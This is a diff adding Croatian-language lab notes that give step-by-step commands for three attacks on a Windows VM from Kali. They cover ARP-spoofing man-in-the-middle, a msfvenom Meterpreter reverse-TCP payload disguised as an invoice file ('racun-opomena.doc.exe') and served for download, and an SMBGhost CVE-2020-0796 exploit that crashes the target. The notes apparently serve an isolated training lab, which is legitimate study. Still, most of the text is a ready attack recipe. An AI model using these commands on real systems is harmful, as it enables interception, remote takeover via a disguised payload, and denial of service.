@@ -113,3 +113,160 @@ ls -l
 
 🔹 Internet = DHCP + NetworkManager ON
 🔹 Meta = Private switch + NetworkManager OFF + ručni IP
+
+🟢 1️⃣ MiTM – ARP Spoofing (Default Switch)
+📌 Mreža (iz dokumenta)
+
+Windows:
+
+IP: 172.30.16.3
+Mask: 255.255.240.0
+Gateway: 172.30.16.1
+DNS: 8.8.8.8
+
+
+Kali:
+
+IP: 172.30.16.2
+Mask: 255.255.240.0
+Gateway: 172.30.16.1
+DNS: 8.8.8.8
+
+📌 Konfiguracija Kali
+sudo ip addr flush dev eth0
+sudo ip addr add 172.30.16.2/20 dev eth0
+sudo ip route add default via 172.30.16.1
+ping 8.8.8.8
+
+📌 Uključi IP forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+
+Mora vratiti:
+
+1
+
+📌 ARP Spoofing (2 terminala)
+Lažiranje prema Windowsu
+sudo arpspoof -i eth0 -t 172.30.16.3 -r 172.30.16.1
+
+Lažiranje prema Gateway-u
+sudo arpspoof -i eth0 -t 172.30.16.1 -t 172.30.16.3
+
+📌 Provjera na Windowsu
+arp -a
+
+
+MAC od Kali (172.30.16.2) mora biti vezan i za gateway IP.
+
+📌 Wireshark dokaz
+
+Odaberi eth0
+
+Filter: icmp
+
+Ako vidiš ping pakete → MiTM uspješan
+
+🔴 2️⃣ Meterpreter – Reverse TCP
+
+(Private switch – bez interneta)
+
+📌 Kali konfiguracija (iz dokumenta)
+sudo ip addr flush dev eth0
+sudo ip addr add 192.168.10.2/24 dev eth0
+ifconfig eth0 up
+netstat -rn
+
+📌 Pokreni Apache
+sudo systemctl start apache2
+
+
+Provjera:
+
+http://127.0.0.1
+
+📌 Kreiranje payload-a
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+lhost=192.168.10.2 lport=5432 -f exe > racun-opomena.doc.exe
+
+📌 Kopiraj payload
+sudo mv racun-opomena.doc.exe /var/www/html/
+
+📌 Listener (Kali)
+msfconsole
+
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.10.2
+set LPORT 5432
+exploit
+
+📌 Windows – preuzimanje payload-a
+curl http://192.168.10.2/racun-opomena.doc.exe -o racun-opomena.doc.exe
+
+
+Pokrenuti fajl.
+
+Ako uspije:
+
+Meterpreter session opened
+
+
+Test:
+
+sysinfo
+
+🟣 3️⃣ SMBGhost – CVE-2020-0796
+
+(iz dokumentacije)
+
+Windows meta:
+
+IP: 192.168.1.10
+Private switch
+Firewall OFF
+
+
+Kali:
+
+IP: 192.168.1.15
+
+📌 Provjera konekcije
+ping 192.168.1.10
+
+📌 Skeniranje porta
+nmap -p 445 192.168.1.10
+
+
+Port 445 mora biti open.
+
+📌 Git clone (internet faza)
+git clone https://github.com/BtrintKomoni/cve-2020-0796
+
+📌 Pokretanje skenera
+python3 cve-2020-0796-scanner.py 192.168.1.10
+
+
+Ako vrati:
+
+Vulnerable
+
+📌 Crash exploit
+git clone https://github.com/jiansitting/CVE-2020-0796
+cd CVE-2020-0796
+sudo python3 cve-2020-0796.py 192.168.1.10
+
+
+Rezultat:
+
+Windows Blue Screen
+
+Reboot
+
+⚠️ SWITCH LOGIKA (NAJBITNIJE)
+
+MiTM → Default Switch
+Meterpreter → Private Switch
+SMBGhost → Private Switch
+Git clone → Internet / Default Switch
